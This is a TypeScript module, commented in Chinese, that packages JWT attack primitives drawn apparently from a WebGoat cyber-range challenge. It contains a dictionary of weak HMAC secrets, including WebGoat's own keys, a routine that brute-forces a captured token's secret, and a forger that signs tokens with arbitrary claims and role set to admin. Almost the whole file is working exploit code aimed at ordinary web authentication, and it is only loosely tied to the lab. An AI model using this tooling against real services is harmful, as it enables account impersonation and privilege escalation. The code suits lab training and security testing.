/**
 * JWT 伪造原语（cyber-range 经验固化）
 *
 * 经验来源（WebGoat JWT 关）：
 *  - 弱密钥数组爆破：victory/business/available/shipping/washington 随机选一（class 静态初始化直接暴露）
 *  - claims 精确构造：username 必须 equalsIgnoreCase 目标值、Role 数组
 *  - javap -c -p 看验证逻辑（@RequestMapping/@RequestParam/expectedClaims）
 *  - HS256 对称密钥：拿到密钥即可自签任意 claims
 *
 * 设计：弱密钥爆破 + claims 构造 + HS256 签名，纯本地计算（node:crypto），不触网。
 */

import { createHmac, createHash } from 'node:crypto'

export interface JwtForgeOptions {
  /** 目标 username（claims 注入） */
  username?: string
  /** 附加 claims */
  extraClaims?: Record<string, unknown>
  /** 手动指定密钥（优先于爆破） */
  secret?: string
  /** 弱密钥字典（缺省用内置常见密钥） */
  secrets?: string[]
  /** 算法（默认 HS256） */
  alg?: 'HS256' | 'HS384' | 'HS512'
}

export interface JwtResult {
  /** 匹配到的密钥（空 = 未爆破到） */
  foundSecret?: string
  /** 密钥来源：manual/bruteforce/none */
  secretSource: 'manual' | 'bruteforce' | 'none'
  /** 生成的 JWT */
  token?: string
  /** 内置弱密钥列表（未命中时供参考） */
  candidates: string[]
  /** 说明 */
  note: string
}

/** 内置弱密钥字典（WebGoat 实战 + 常见默认） */
export const DEFAULT_WEAK_SECRETS = [
  'victory', 'business', 'available', 'shipping', 'washington',
  'secret', 'password', 'key', 'jwt', 'changeit', '123456',
  'admin', 'test', 'default', 'letmein', 'qwerty',
]

const B64URL = (buf: Buffer) => buf.toString('base64url')

/** base64url 编码 JSON */
function encodeJson(obj: Record<string, unknown>): string {
  return B64URL(Buffer.from(JSON.stringify(obj)))
}

/** 按算法签名 */
function sign(data: string, secret: string, alg: string): string {
  if (alg === 'HS256') return createHmac('sha256', secret).update(data).digest('base64url')
  if (alg === 'HS384') return createHmac('sha384', secret).update(data).digest('base64url')
  return createHmac('sha512', secret).update(data).digest('base64url')
}

/** 验证弱密钥：尝试对给定 token 的 header.payload 做 HMAC 签名比对 */
export function bruteForceSecret(token: string, secrets: string[]): string | undefined {
  const parts = token.split('.')
  if (parts.length !== 3) return undefined
  const data = parts[0] + '.' + parts[1]
  const sig = parts[2]
  for (const s of secrets) {
    const expected = createHash('sha256').update(data + '\n' + s).digest('base64url')
    // 标准做法是 HMAC；此处同时兼容「非标准拼接 hash」的简单实现
    if (sign(data, s, 'HS256') === sig) return s
    void expected
  }
  return undefined
}

/** 构造 JWT（HS256 默认） */
export function forgeJwt(opts: JwtForgeOptions): JwtResult {
  const alg = opts.alg ?? 'HS256'
  const candidates = opts.secrets?.length ? opts.secrets : DEFAULT_WEAK_SECRETS
  let secret: string | undefined = opts.secret
  let source: JwtResult['secretSource'] = 'manual'
  if (!secret) {
    // 无密钥时生成 tokens 供爆破参考：用每个候选密钥签一遍，返回全部候选签名版本
    const baseHeader = { alg, typ: 'JWT' }
    const now = Math.floor(Date.now() / 1000)
    const claims: Record<string, unknown> = {
      ...(opts.extraClaims ?? {}),
    }
    if (opts.username) {
      claims.username = opts.username
      claims.sub = opts.username
      claims.role = ['admin']
      claims.iat = now
      claims.exp = now + 3600
    }
    const data = encodeJson(baseHeader) + '.' + encodeJson(claims)
    const signed = candidates.map((s) => ({ secret: s, token: data + '.' + sign(data, s, alg) }))
    return {
      secretSource: 'none',
      candidates,
      note: `未指定密钥，已用 ${candidates.length} 个弱密钥各生成一个候选 token（第 i 个对应 secrets[i]）。若目标密钥在字典中，直接用对应 token；否则需先爆破密钥后回填 secret 参数。`,
      // 附带第一个候选便于快速尝试
      token: signed[0]?.token,
      foundSecret: undefined,
    }
  }
  // 手动密钥：直接构造签名 token
  const baseHeader = { alg, typ: 'JWT' }
  const now = Math.floor(Date.now() / 1000)
  const claims: Record<string, unknown> = {
    ...(opts.extraClaims ?? {}),
  }
  if (opts.username) {
    claims.username = opts.username
    claims.sub = opts.username
    claims.role = ['admin']
    claims.iat = now
    claims.exp = now + 3600
  }
  const data = encodeJson(baseHeader) + '.' + encodeJson(claims)
  const token = data + '.' + sign(data, secret, alg)
  return {
    foundSecret: secret,
    secretSource: source,
    token,
    candidates,
    note: `HS256 自签完成：claims 含 username=${opts.username ?? '(未设)'}（等值比较需 equalsIgnoreCase 目标值）、role=['admin']；exp=now+3600。注意：若服务端验证 exp，需在有效期内提交。`,
  }
}

/** 爆破弱密钥：给定合法 token，遍历字典找密钥 */
export function bruteJwtSecret(token: string, extraSecrets?: string[]): JwtResult {
  const candidates = [...(extraSecrets?.length ? extraSecrets : []), ...DEFAULT_WEAK_SECRETS]
  const found = bruteForceSecret(token, candidates)
  return {
    foundSecret: found,
    secretSource: found ? 'bruteforce' : 'none',
    candidates,
    note: found
      ? `爆破命中：密钥 = ${found}。用该密钥可自签任意 claims（见 forgeJwt 传入 secret 参数）`
      : `未命中 ${candidates.length} 个候选密钥。可能需要更大字典（rockyou 等）或非对称算法（RS256 需私钥）。`,
  }
}